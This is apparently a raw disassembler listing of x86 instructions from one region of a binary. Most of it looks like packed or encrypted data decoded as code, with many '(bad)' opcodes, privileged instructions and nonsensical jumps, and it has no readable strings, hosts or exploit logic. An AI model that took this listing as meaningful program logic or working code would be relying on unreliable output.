  41754d:	cmp    DWORD PTR [eax+0x58],0x38
  417551:	and    esp,0x37628d98
  417557:	cmp    ch,BYTE PTR [ecx-0x44]
  41755a:	jmp    0x9ceba29a
  41755f:	test   eax,0x28850fb
  417564:	inc    edx
  417565:	mov    ds:0xe25750ff,al
  41756a:	inc    esp
  41756b:	test   DWORD PTR [eax+0x6d],esi
  41756e:	xor    BYTE PTR [edi+0xc],dh
  417571:	sbb    bh,BYTE PTR [esi-0x11]
  417574:	pushf  
  417575:	les    ecx,FWORD PTR [edx+0x30bcce7e]
  41757b:	addr16 or al,0x1
  41757e:	and    eax,0x4bef3775
  417583:	jecxz  0x417573
  417585:	xchg   ebx,eax
  417586:	lea    esi,[ebx]
  417588:	mov    ecx,0x437a5d6b
  41758d:	jecxz  0x4175a0
  41758f:	pop    ss
  417590:	dec    esi
  417591:	jle    0x4175cd
  417593:	enter  0x6a1c,0x97
  417597:	call   0x6ab3:0x6ab34a89
  41759e:	aas    
  41759f:	aas    
  4175a0:	or     dh,cl
  4175a2:	push   0xffffffc0
  4175a4:	nop
  4175a5:	jg     0x417565
  4175a7:	cmp    eax,edx
  4175a9:	outs   dx,DWORD PTR ds:[esi]
  4175aa:	loopne 0x417602
  4175ac:	sub    al,bl
  4175ae:	into   
  4175af:	sub    esi,DWORD PTR [edi+0x580c5746]
  4175b5:	push   es
  4175b6:	sub    esp,esi
  4175b8:	and    al,0xd7
  4175ba:	icebp  
  4175bb:	lahf   
  4175bc:	gs rol BYTE PTR ds:[ebx+ebx*2],1
  4175c1:	mov    eax,ds:0x1653385b
  4175c6:	sti    
  4175c7:	inc    ebx
  4175c8:	pop    ecx
  4175c9:	bound  ebp,QWORD PTR [edx-0x4]
  4175cc:	inc    edi
  4175cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175ce:	cmc    
  4175cf:	loop   0x417624
  4175d1:	nop
  4175d2:	add    DWORD PTR [ebx-0x8],esp
  4175d5:	adc    bh,BYTE PTR [edx-0x4a]
  4175d8:	push   ss
  4175d9:	dec    esi
  4175da:	dec    esp
  4175db:	les    ecx,FWORD PTR [esi]
  4175dd:	mov    ds:0x99d10ccc,al
  4175e2:	mov    eax,ds:0xdd865221
  4175e7:	retf   
  4175e8:	stos   BYTE PTR es:[edi],al
  4175e9:	fwait
  4175ea:	(bad)  
  4175ed:	pusha  
  4175ee:	adc    esi,DWORD PTR [esi-0x7e]
  4175f1:	xor    eax,0x4d7c8f5b
  4175f6:	sub    DWORD PTR [ecx-0x171c60b2],esi
  4175fc:	arpl   WORD PTR ds:0xae1cc440,dx
  417602:	pop    ds
  417603:	dec    edx
  417604:	nop
  417605:	cmp    dh,ch
  417607:	pop    eax
  417608:	inc    esi
  417609:	jne    0x41764e
  41760b:	imul   edi,esp,0x2e
  41760e:	imul   bl
  417610:	mov    ah,0x8e
  417613:	(bad)  
  417614:	test   BYTE PTR [ebx-0x3b],0xdd
  417618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417619:	mov    esi,0xdf61a651
  41761e:	sti    
  41761f:	xchg   ebp,eax
  417620:	cs in  eax,dx
  417622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417623:	push   ecx
  417624:	iret   
  417625:	jmp    0xa87e3d81
  41762a:	clc    
  41762b:	sub    ebx,ebp
  41762d:	sbb    BYTE PTR [ecx+0x5b],ch
  417630:	fld    QWORD PTR [esi-0x28]
  417633:	je     0x417628
  417635:	inc    edi
  417636:	sub    dl,bl
  417638:	xor    bl,ch
  41763a:	and    eax,0xcc772c5
  41763f:	jns    0x41765c
  417641:	data16 add BYTE PTR [eax],al
	...
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	stos   BYTE PTR es:[edi],al
  4176c1:	push   es
  4176c2:	pop    es
  4176c3:	cdq    
  4176c4:	jle    0x4176c5
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	test   BYTE PTR [eax],0x0
  4176cb:	add    BYTE PTR ds:0x8e360647,cl
  4176d1:	cwde   
  4176d2:	ror    BYTE PTR [ebx+eax*4-0x579b8398],cl
  4176d9:	fist   DWORD PTR [esi-0x147b5b12]
  4176df:	pushf  
  4176e0:	and    DWORD PTR [edi],edx
  4176e2:	call   DWORD PTR [edi]
  4176e4:	push   ebp
  4176e5:	mov    al,0x7d
  4176e7:	lods   eax,DWORD PTR ds:[esi]
  4176e8:	mov    ds,WORD PTR [ecx+eax*2-0x75]
  4176ec:	int    0xff
  4176ee:	push   0xffffff8c
  4176f0:	inc    ebx
  4176f1:	and    DWORD PTR [eax],ebx
  4176f3:	ins    DWORD PTR es:[edi],dx
  4176f4:	out    dx,eax
  4176f5:	stc    
  4176f6:	adc    BYTE PTR [ebp+0x5a],cl
  4176f9:	ret    
  4176fa:	aam    0x6e
  4176fc:	dec    ebp
  4176fd:	inc    esp
  4176fe:	xor    esp,DWORD PTR [ebx+0xb427136]
  417704:	mov    dh,0x53
  417706:	ss popf 
  417708:	imul   edx,eax,0x189bf449
  41770e:	leave  
  41770f:	fistp  QWORD PTR [ebp+0x48199f25]
  417715:	push   eax
  417716:	xor    al,BYTE PTR [edi+edx*2]
  417719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41771a:	adc    DWORD PTR [edi-0x2270ee74],esi
  417720:	jne    0x4176ec
  417722:	out    0xbb,al
  417724:	adc    eax,0x928bc1bf
  417729:	stc    
  41772a:	jmp    0xacc1:0x40d25616
  417731:	push   es
  417732:	sbb    ebp,DWORD PTR [ebx+edi*1]
  417735:	or     DWORD PTR [edi-0x3642658e],edx
  41773b:	bound  ebp,QWORD PTR [edi-0x54]
  41773e:	cmp    BYTE PTR [edi+0x7d2f2f07],bh
  417744:	jmp    0x5324:0x86f091aa
  41774b:	test   DWORD PTR [ebx],ebp
  41774d:	adc    bh,dl
  41774f:	add    al,0x52
  417751:	jg     0x41778d
  417753:	loope  0x4177ae
  417755:	or     al,0x78
  417757:	imul   eax,DWORD PTR [edi-0x3a],0xce837d38
  41775e:	xchg   ebp,eax
  41775f:	add    eax,0xcea5456c
  417764:	jle    0x417755
  417766:	or     eax,0x46ae9895
  41776b:	or     edx,DWORD PTR [ecx+esi*2-0x1583901b]
  417772:	aaa    
  417773:	xor    eax,0xcef89ec4
  417778:	mov    ds:0x19d1683b,al
  41777d:	jmp    0x417707
  41777f:	es mov al,0x17
  417782:	out    0xca,eax
  417784:	pushf  
  417785:	loope  0x417745
  417787:	iret   
  417788:	mov    dh,0xef
  41778a:	mov    al,0x80
  41778c:	repnz popa 
  41778e:	ret    
  41778f:	jo     0x417747
  417791:	es mov ebp,0x14fc0487
  417797:	cmp    al,0xaa
  417799:	jl     0x4177b8
  41779b:	retf   
  41779c:	xor    eax,0x8d47f08c
  4177a1:	sub    BYTE PTR [esp+esi*1+0x66],dl
  4177a5:	mov    al,cl
  4177a7:	sbb    bh,BYTE PTR [ecx+eiz*4]
  4177aa:	or     dh,BYTE PTR [ebp+0x2024e6a5]
  4177b0:	pop    esp
  4177b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177b2:	sbb    eax,0x800a113
  4177b7:	lahf   
  4177b8:	paddq  mm1,QWORD PTR [ecx+0x25]
  4177bc:	mov    eax,0x1ca8aba6
  4177c1:	out    0x0,eax
	...
  417833:	add    cl,dl
  417835:	scas   eax,DWORD PTR es:[edi]
  417836:	push   es
  417837:	repz jle 0x417835
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0xb37d6e99
  417841:	adc    BYTE PTR [ebx],bh
  417843:	retf   0x74
  417846:	add    DWORD PTR [eax],eax
  417848:	test   BYTE PTR [eax],0x0
  41784b:	add    BYTE PTR ds:0xd99a2d,bl
  417851:	ins    BYTE PTR es:[edi],dx
  417852:	push   ds
  417853:	(bad)  
  417854:	fcmovb st,st(3)
  417856:	inc    ebp
  417857:	ins    DWORD PTR es:[edi],dx
  417858:	loopne 0x41785b
  41785a:	inc    esi
  41785b:	arpl   WORD PTR [edx],ax
  41785d:	loope  0x4178c3
  41785f:	sbb    esp,DWORD PTR [eax+0x4fae62d5]
  417865:	push   es
  417866:	repnz pop ss
  417868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417869:	mov    bl,0x19
  41786b:	test   eax,0x1b0cbbc2
  417870:	mov    dl,0x1c
  417872:	enter  0xb73,0x4
  417876:	cmp    eax,0xef5cb11b
  41787b:	jge    0x4178c0
  41787d:	ror    BYTE PTR [esi-0xd],1
  417880:	mov    edi,0xbe1ae229
  417885:	jb     0x4178c0
  417887:	jle    0x417830
  417889:	jmp    0x4178f2
  41788b:	jbe    0x41790b
  41788d:	mov    al,ds:0x7bd48a26
  417892:	adc    esp,DWORD PTR [esi]
  417894:	or     DWORD PTR [edi-0x490739d7],ecx
  41789a:	sub    eax,0x174aab35
  41789f:	lea    edi,[esi+0x6a]
  4178a2:	dec    eax
  4178a3:	aam    0x67
  4178a5:	dec    ecx
  4178a6:	dec    eax
  4178a7:	adc    esi,eax
  4178a9:	inc    ebx
  4178aa:	jl     0x4178ae
  4178ac:	and    DWORD PTR [ebp+0x59],edx
  4178af:	ja     0x4178ad
  4178b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178b2:	inc    edi
  4178b3:	cmp    al,0x9c
  4178b5:	cmp    DWORD PTR [ebp+0x29],0xffffff95
  4178b9:	jbe    0x417917
  4178bb:	pushf  
  4178bc:	int3   
  4178bd:	fwait
  4178be:	pop    ss
  4178bf:	popf   
  4178c0:	and    al,0xe9
  4178c2:	pop    ebx
  4178c3:	sbb    eax,0x531ce588
  4178c8:	fsubr  DWORD PTR [edi]
  4178ca:	push   eax
  4178cb:	div    DWORD PTR [ecx+0x53fd85a8]
  4178d1:	scas   al,BYTE PTR es:[edi]
  4178d2:	mov    edi,DWORD PTR [ebp+0x64]
  4178d5:	mov    eax,ds:0x6b478fc3
  4178da:	inc    esi
  4178db:	ins    DWORD PTR es:[edi],dx
  4178dc:	cwde   
  4178dd:	jnp    0x417910
  4178df:	fisub  DWORD PTR [ecx+eiz*2+0x49d191ae]
  4178e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178e7:	int    0x31
  4178e9:	push   0xffffffaa
  4178eb:	jne    0x41794c
  4178ed:	out    dx,eax
  4178ee:	push   ds
  4178ef:	add    al,0x55
  4178f1:	ins    DWORD PTR es:[edi],dx
  4178f2:	lock cli 
  4178f4:	idiv   BYTE PTR [esi]
  4178f6:	loopne 0x4178f1
  4178f8:	scas   al,BYTE PTR es:[edi]
  4178f9:	sahf   
  4178fa:	pop    ecx
  4178fb:	push   ss
  4178fc:	pop    esi
  4178fd:	fiadd  DWORD PTR [ecx+0x12ee2fc1]
  417903:	adc    BYTE PTR [edx-0x36e8c669],dh
  417909:	push   ds
  41790a:	loop   0x417931
  41790c:	xlat   BYTE PTR ds:[ebx]
  41790d:	jae    0x417925
  41790f:	sbb    dh,BYTE PTR [ebx+0xe781576]
  417915:	ja     0x41794e
  417917:	ds (bad) 
  417919:	fidivr DWORD PTR [esi+0xd1f0581]
  41791f:	repz dec ebp
  417921:	or     DWORD PTR ss:[edx-0x3fbb4fcd],0xfffffff0
  417929:	mov    esp,0xe0ea1163
  41792e:	in     eax,0xe7
  417930:	lahf   
  417931:	adc    DWORD PTR [ecx+0x53],esp
  417934:	cmp    BYTE PTR [ecx],al
  417936:	fldenv [esi+0x4abe7582]
  41793c:	adc    edi,eax
  41793e:	push   es
  41793f:	mov    ch,0x52
  417941:	mov    edi,0x0
	...
  4179b2:	add    BYTE PTR [eax],al
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x4477c980]
  4179c2:	mov    ds:0x1016a38,eax
  4179c7:	add    dh,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    cl,al
  4179cd:	lods   eax,DWORD PTR ds:[esi]
  4179ce:	dec    edx
  4179cf:	je     0x41797f
  4179d1:	push   0x793eb1ee
  4179d6:	aad    0xc5
  4179d8:	ins    BYTE PTR es:[edi],dx
  4179d9:	int    0x4d
  4179db:	sub    ebp,DWORD PTR [esp+edi*4]
  4179de:	jb     0x4179fa
  4179e0:	jge    0x417986
  4179e2:	sub    DWORD PTR [ebx],0x7aef4756
  4179e8:	push   es
  4179e9:	addr16 jo 0x4179b8
  4179ec:	push   eax
  4179ed:	mov    BYTE PTR [ecx+0x1c],0x59
  4179f1:	adc    al,0x74
  4179f3:	adc    al,cl
  4179f5:	das    
  4179f6:	cmp    edi,0xffffffb9
  4179f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179fa:	xchg   ecx,eax
  4179fb:	sbb    al,BYTE PTR [edi+ebx*1-0x16]
  4179ff:	mov    ebp,0x67cc091f
  417a04:	dec    ecx
  417a05:	fistp  DWORD PTR [esi-0x23]
  417a08:	outs   dx,BYTE PTR ds:[esi]
  417a09:	int3   
  417a0a:	mov    BYTE PTR [eax-0x1ced8f5e],cl
  417a10:	sub    al,0x7e
  417a12:	xlat   BYTE PTR ds:[ebx]
  417a13:	sar    BYTE PTR [eax-0x4ee8a372],cl
  417a19:	adc    BYTE PTR [esi-0x3bf6f924],dl
  417a1f:	fcomip st,st(0)
  417a21:	dec    ebx
  417a22:	arpl   ax,bp
  417a24:	arpl   cx,ax
  417a26:	dec    ebp
  417a27:	jge    0x417a44
  417a29:	inc    edx
  417a2a:	adc    al,0x17
  417a2c:	push   ss
  417a2d:	lods   eax,DWORD PTR ds:[esi]
  417a2e:	add    DWORD PTR [edi+ecx*1],esi
  417a31:	push   0xe2703a60
  417a36:	add    ebx,0x48
  417a39:	scas   al,BYTE PTR es:[edi]
  417a3a:	adc    dl,dh
  417a3c:	loopne 0x417aba
  417a3e:	mov    dh,0x37
  417a40:	cmp    ebp,0xffffff8a
  417a43:	shl    DWORD PTR [ecx-0x33ab074d],1
  417a49:	in     eax,0x42
  417a4b:	pop    esi
  417a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a4d:	inc    esp
  417a4e:	xchg   esp,ecx
  417a50:	push   ebp
  417a51:	stos   BYTE PTR es:[edi],al
  417a52:	push   0xd993b43d
  417a57:	mov    ecx,eax
  417a59:	out    0x7e,eax
  417a5b:	sbb    BYTE PTR [esi+0x2c57f992],0x3e
  417a62:	mul    DWORD PTR [ebp+edx*8-0x359eb182]
  417a69:	dec    ebx
  417a6a:	cmc    
  417a6b:	pop    ecx
  417a6c:	add    DWORD PTR [ecx-0x79360921],edx
  417a72:	(bad)  
  417a74:	sub    DWORD PTR [edi],ecx
  417a76:	dec    edx
  417a77:	leave  
  417a78:	pushf  
  417a79:	adc    al,0x8f
  417a7b:	jne    0x417a4a
  417a7d:	cli    
  417a7e:	jle    0x417ae0
  417a80:	(bad)  
  417a81:	aas    
  417a82:	mov    ?,WORD PTR [edx-0x52]
  417a85:	frstor [esi+0x751f9a6e]
  417a8b:	push   0x363b2f33
  417a90:	mov    ds:0x3eb91e10,al
  417a95:	imul   ebp,DWORD PTR [eax-0x6b],0x5727efb2
  417a9c:	aad    0x19
  417a9e:	jmp    0x60eb:0x6851a059
  417aa5:	mov    WORD PTR [eax-0x5fd3c1ed],es
  417aab:	retf   0xba26
  417aae:	mov    ecx,0x6f82ddd1
  417ab3:	lods   eax,DWORD PTR ds:[esi]
  417ab4:	mov    cl,0x4f
  417ab6:	xchg   ebx,eax
  417ab7:	pop    eax
  417ab8:	fisubr WORD PTR [edx]
  417aba:	pusha  
  417abb:	xchg   edi,eax
  417abc:	fst    DWORD PTR [ecx+0x1d]
  417abf:	xor    eax,0x1c75
	...
  417b34:	jecxz  0x417b9b
  417b36:	push   cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0xe6fef5f7
  417b41:	pusha  
  417b42:	out    0xf1,al
  417b44:	pusha  
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    dh,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    cl,ch
  417b4d:	push   ecx
  417b4e:	in     al,0xe8
  417b50:	xchg   ebp,eax
  417b51:	jg     0x417b0d
  417b53:	jnp    0x417bd4
  417b55:	push   ebp
  417b56:	loope  0x417b5a
  417b58:	iret   
  417b59:	xchg   ebp,eax
  417b5a:	fldenv [ecx-0x4c]
  417b5d:	cli    
  417b5e:	das    
  417b5f:	mov    eax,0xb5334ca2
  417b64:	out    0x6a,al
  417b66:	adc    bh,bl
  417b68:	xor    ah,BYTE PTR [edi+0x1d]
  417b6b:	mov    BYTE PTR [ebp+0x59],ah
  417b6e:	cmp    al,0x33
  417b70:	adc    ebp,edi
  417b72:	mov    ebp,0xfa29a7b0
  417b77:	outs   dx,DWORD PTR ds:[esi]
  417b78:	inc    bl
  417b7a:	mov    esi,0xfad77eaa
  417b7f:	pop    es
  417b80:	xor    ebx,DWORD PTR [edx+eax*2]
  417b83:	xchg   esi,eax
  417b84:	in     al,dx
  417b85:	xchg   ecx,eax
  417b86:	mov    edx,0x740b03a3
  417b8b:	retf   0x468d
  417b8e:	xchg   ecx,eax
  417b8f:	lods   al,BYTE PTR ds:[esi]
  417b90:	or     eax,0x58257679
  417b95:	iret   
  417b96:	daa    
  417b97:	arpl   WORD PTR [edx-0x21],cx
  417b9a:	arpl   WORD PTR [edx-0x22035f4f],si
  417ba0:	iret   
  417ba1:	inc    BYTE PTR [ecx+0x2c197be4]
  417ba7:	xor    al,0xe0
  417ba9:	sbb    esi,DWORD PTR [edx+0x71]
  417bac:	and    di,0xf7c6
  417bb1:	sub    ecx,DWORD PTR [ebx-0x7]
  417bb4:	mov    bl,0x41
  417bb6:	mov    ds:0x2aa57063,eax
  417bbb:	inc    esi
  417bbc:	jmp    0x417bd5
  417bbe:	push   ds
  417bbf:	mov    eax,ds:0x26cb1b5f
  417bc4:	xor    al,0xc1
  417bc6:	xor    ah,BYTE PTR [esi+eiz*8]
  417bc9:	sbb    al,0x76
  417bcb:	pop    ebp
  417bcc:	data16 fmulp st(0),st
  417bcf:	mov    ds:0x6a69fa0b,eax
  417bd4:	sub    eax,DWORD PTR [edi+0x71]
  417bd7:	fmul   QWORD PTR ds:0x1637c528
  417bdd:	push   ds
  417bde:	jg     0x417ba9
  417be0:	cs daa 
  417be2:	retf   
  417be3:	mov    BYTE PTR [ebx+eiz*8-0x7bc22650],ah
  417bea:	into   
  417beb:	loope  0x417beb
  417bed:	push   edi
  417bee:	add    BYTE PTR [ecx-0x4d],cl
  417bf1:	shl    DWORD PTR [edi],1
  417bf3:	aam    0x4
  417bf5:	out    dx,eax
  417bf6:	xchg   esi,eax
  417bf7:	adc    DWORD PTR [edi-0x28641c3e],0xfffffff0
  417bfe:	jo     0x417b99
  417c00:	mov    BYTE PTR [edi+0x78755e6e],dl
  417c06:	mov    dl,0x30
  417c08:	cmc    
  417c09:	mov    al,ds:0xf7da4266
  417c0e:	pop    es
  417c0f:	jnp    0x417bd7
  417c11:	pop    ebx
  417c12:	adc    al,ch
  417c14:	clc    
  417c15:	add    bl,ah
  417c17:	lds    ecx,FWORD PTR [edx+0x1]
  417c1a:	mov    bh,0x63
  417c1c:	pop    esi
  417c1d:	xchg   esi,eax
  417c1e:	shl    DWORD PTR [ebx],0xaa
  417c21:	shl    DWORD PTR [ebp+0x13],cl
  417c24:	imul   edi
  417c26:	ror    BYTE PTR [ebp-0x5e2c631a],cl
  417c2c:	or     DWORD PTR [ecx-0x3e],ecx
  417c2f:	mov    ebp,0x7b093609
  417c34:	or     dh,bl
  417c36:	sub    al,0xd8
  417c38:	jge    0x417c03
  417c3a:	(bad)  
  417c3b:	loopne 0x417c3d
  417c3d:	test   al,0xe0
  417c3f:	fwait
  417c40:	pop    ds
  417c41:	xor    DWORD PTR [eax],eax
	...
  417cb3:	add    BYTE PTR [ecx],ah
  417cb5:	xchg   ebx,eax
  417cb6:	mov    DWORD PTR [edi-0x60d84045],ebp
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [edi],edx
  417cc1:	neg    BYTE PTR [ebx+0x10356bf]
  417cc7:	add    dh,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [ebp+0x2a],dh
  417cce:	(bad)  
  417cd1:	xchg   esi,eax
  417cd2:	(bad)  
  417cd3:	pop    ss
  417cd4:	push   ds
  417cd5:	add    ebx,edi
  417cd7:	out    0x29,al
  417cd9:	cmp    eax,0xa45db26b
  417cde:	iret   
  417cdf:	(bad)  
  417ce0:	mov    bh,0xbd
  417ce2:	dec    ebp
  417ce3:	int    0x54
  417ce5:	rol    BYTE PTR [edi+0x164c220e],cl
  417ceb:	or     al,0x4d
  417ced:	add    eax,0x84c7b759
  417cf2:	jmp    0x24ee:0xb2f1b334
  417cf9:	aaa    
  417cfa:	jb     0x417d63
  417cfc:	cmp    al,BYTE PTR es:[edi-0x5a]
  417d00:	mov    al,0x69
  417d02:	enter  0xe3a8,0x84
  417d06:	aam    0x23
  417d08:	fnsave [eax+0x27]
  417d0b:	div    BYTE PTR [ecx-0x43]
  417d0e:	inc    ebx
  417d0f:	and    ch,bl
  417d11:	mov    eax,ds:0x259cf618
  417d16:	mov    ah,BYTE PTR [edx+0x60]
  417d19:	mov    bl,0x52
  417d1b:	inc    ebp
  417d1c:	cs adc al,0xa2
  417d1f:	fnstsw WORD PTR [edi]
  417d21:	nop
  417d22:	out    dx,eax
  417d23:	fdiv   DWORD PTR [edi-0x27]
  417d26:	int3   
  417d27:	loop   0x417d0b
  417d29:	jno    0x417d29
  417d2b:	and    ch,BYTE PTR [edi+ebx*4+0x463796ef]
  417d32:	push   ds
  417d33:	mov    bl,0xf4
  417d35:	jo     0xebbc133f
  417d3b:	mov    DWORD PTR [eax],ebx
  417d3d:	ss (bad) 
  417d3f:	(bad)  
  417d40:	in     al,dx
  417d41:	xchg   edx,eax
  417d42:	inc    ebx
  417d43:	scas   eax,DWORD PTR es:[edi]
  417d44:	xor    BYTE PTR [ebp-0x79823338],bl
  417d4a:	inc    edx
  417d4b:	dec    ebp
  417d4c:	inc    ebx
  417d4d:	inc    ecx
  417d4e:	jmp    0x343a:0x8c31e7ff
  417d55:	mov    bl,0xc6
  417d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d58:	jle    0x417d3e
  417d5a:	mov    ah,0x35
  417d5c:	int3   
  417d5d:	jns    0x417ddc
  417d5f:	push   eax
  417d60:	mov    DWORD PTR [edx-0x19],edx
  417d63:	jecxz  0x417d4f
  417d65:	ret    
  417d66:	push   ss
  417d67:	adc    bl,BYTE PTR [ecx-0x5c4c6545]
  417d6d:	mov    esp,0x932d69ea
  417d72:	add    eax,0x5004824f
  417d77:	es pop es
  417d79:	cs mov esi,ss
  417d7c:	or     WORD PTR [ecx-0x5c],ax
  417d80:	into   
  417d81:	jcxz   0x417d15
  417d84:	pusha  
  417d85:	jns    0x417d33
  417d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d88:	sahf   
  417d89:	in     eax,0x88
  417d8b:	imul   BYTE PTR [esi-0x11]
  417d8e:	enter  0x6176,0xea
  417d92:	jbe    0x417d3e
  417d94:	push   ebx
  417d95:	ror    dh,cl
  417d97:	sbb    cl,BYTE PTR [eax+0x38]
  417d9a:	mov    cl,0xb1
  417d9c:	mov    edx,0xb4ee22f8
  417da1:	jge    0x417e20
  417da3:	retf   0xc79e
  417da6:	aas    
  417da7:	xor    DWORD PTR [ecx-0x736e34d],ebx
  417dad:	mov    eax,0xec599f0b
  417db2:	bound  eax,QWORD PTR [ebx+0x6c]
  417db5:	sar    BYTE PTR [edx+0x2456ef04],1
  417dbb:	xor    al,dh
  417dbd:	int3   
  417dbe:	not    DWORD PTR [ecx+0x9452]
	...
  417e34:	mov    edi,0xae6d8e19
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	fsub   DWORD PTR [ecx+0x44ccaea]
  417e46:	add    DWORD PTR [eax],eax
  417e48:	test   BYTE PTR [eax],0x0
  417e4b:	add    BYTE PTR [esi-0x6409fe3d],ah
  417e51:	out    0x7d,al
  417e53:	fs xchg esp,eax
  417e55:	adc    esi,ebp
  417e57:	retf   0x88e4
  417e5a:	sub    bl,BYTE PTR [ecx]
  417e5c:	push   edx
  417e5d:	xchg   esi,eax
  417e5e:	repz cs ds pop ds
  417e62:	push   0xffffff85
  417e64:	lea    ecx,[ebp+0x4d7300da]
  417e6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e6b:	or     eax,0x7c25cd1
  417e70:	les    esp,FWORD PTR [ecx-0x43bda2b2]
  417e76:	mov    esp,0x932fa572
  417e7b:	adc    eax,0xd73562e2
  417e80:	mov    bh,0xbe
  417e82:	sub    al,0xf6
  417e84:	jp     0x417e9b
  417e86:	jae    0x417ee2
  417e88:	pusha  
  417e89:	jle    0x417f07
  417e8b:	out    dx,eax
  417e8c:	add    DWORD PTR [ecx],eax
  417e8e:	and    al,0xa1
  417e90:	inc    ebx
  417e91:	push   es
  417e92:	lahf   
  417e93:	retf   
  417e94:	adc    al,0x8b
  417e96:	cmp    al,0x40
  417e98:	inc    esp
  417e99:	push   esp
  417e9a:	jne    0x417e3e
  417e9c:	loopne 0x417f0b
  417e9e:	cmp    cl,BYTE PTR [ebp+0x24]
  417ea1:	mov    BYTE PTR [edx+0x3bd27b1],ah
  417ea7:	stc    
  417ea8:	push   ebp
  417ea9:	ja     0x417ead
  417eab:	aad    0xda
  417ead:	bound  edx,QWORD PTR ds:0x20be4f5
  417eb3:	pop    esi
  417eb4:	out    dx,eax
  417eb5:	xor    eax,0x837049c
  417eba:	sub    ch,BYTE PTR [edx+ebx*8-0x42]
  417ebe:	jb     0x417ebd
  417ec0:	add    ebx,DWORD PTR [edx]
  417ec2:	(bad)  
  417ec3:	repz pop ss
  417ec5:	lsl    esi,WORD PTR [eax]
  417ec8:	or     DWORD PTR ds:0xe89e0b2c,edx
  417ece:	ja     0x417f2e
  417ed0:	enter  0x365e,0xee
  417ed4:	jmp    0x5691:0xa0fa2009
  417edb:	sbb    al,0x92
  417edd:	mov    ah,0xf8
  417edf:	pop    es
  417ee0:	out    0x67,eax
  417ee2:	sbb    ebx,DWORD PTR [eax]
  417ee4:	add    eax,DWORD PTR [esi-0x2f7293ea]
  417eea:	jmp    0x14ac:0x6befd93a
  417ef1:	xchg   ebx,eax
  417ef2:	sub    esp,DWORD PTR ds:0x60142779
  417ef8:	push   0x20a197e6
  417efd:	fwait
  417efe:	cmp    BYTE PTR [eax+0x56e76d34],bh
  417f04:	mov    ds:0xc795e546,al
  417f09:	loopne 0x417ed5
  417f0b:	inc    esi
  417f0c:	hlt    
  417f0d:	xchg   esp,eax
  417f0e:	or     ebp,DWORD PTR es:[ecx]
  417f11:	jmp    0x417f78
  417f13:	fld    TBYTE PTR [ecx-0x63]
  417f16:	repz mov edi,0x4416b5ba
  417f1c:	cs jbe 0x417f98
  417f1f:	pop    edi
  417f20:	add    BYTE PTR [eax],dh
  417f22:	inc    esp
  417f23:	jle    0x417f35
  417f25:	dec    edx
  417f26:	mov    bh,0xbe
  417f28:	in     eax,dx
  417f29:	mov    dh,0x3e
  417f2b:	add    BYTE PTR [esi+edi*1+0x29],dl
  417f2f:	out    0x61,eax
  417f31:	mov    al,ds:0xcfdbebfe
  417f36:	aad    0x26
  417f38:	mov    ebx,0xa10c98c8
  417f3d:	fdivr  QWORD PTR [edi+0x5e6d66]
	...
  417fb3:	add    BYTE PTR [esi+0x2d],dh
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	(bad)  
  417fc1:	cmp    ecx,ecx
  417fc3:	arpl   WORD PTR [edx+0x5],ax
  417fc6:	add    DWORD PTR [eax],eax
  417fc8:	test   BYTE PTR [eax],0x0
  417fcb:	add    al,bl
  417fcd:	xchg   ebx,eax
  417fce:	js     0x418016
  417fd0:	fxch   st(6)
  417fd2:	mov    bh,0xaf
  417fd4:	test   DWORD PTR [eax-0x35f70cce],edi
  417fda:	ins    BYTE PTR es:[edi],dx
  417fdb:	mov    DWORD PTR [ebx+0xe],edx
  417fde:	leave  
  417fdf:	(bad)  
  417fe0:	push   ebx
  417fe1:	pop    edx
  417fe2:	clc    
  417fe3:	(bad)  
  417fe4:	mov    ebx,0x183e7bbc
  417fe9:	les    esp,FWORD PTR [edx+0xe]
  417fec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fed:	add    eax,edi
  417fef:	push   edi
  417ff0:	inc    ebp
  417ff1:	sti    
  417ff2:	ins    DWORD PTR es:[edi],dx
  417ff3:	mov    ah,0xb7
  417ff5:	fwait
  417ff6:	and    al,0xb9
  417ff8:	add    ch,BYTE PTR [eax+edi*2]
  417ffb:	int3   
  417ffc:	mov    esi,0x1276897a
  418001:	pop    edi
  418002:	scas   eax,DWORD PTR es:[edi]
  418003:	mov    al,0x36
  418005:	sti    
  418006:	pop    ebp
  418007:	cdq    
  418008:	repz (bad) 
  41800a:	(bad)  
  41800b:	cmp    DWORD PTR [ecx],ecx
  41800d:	xor    al,0x5e
  41800f:	repz and esp,DWORD PTR [ebx]
  418012:	int3   
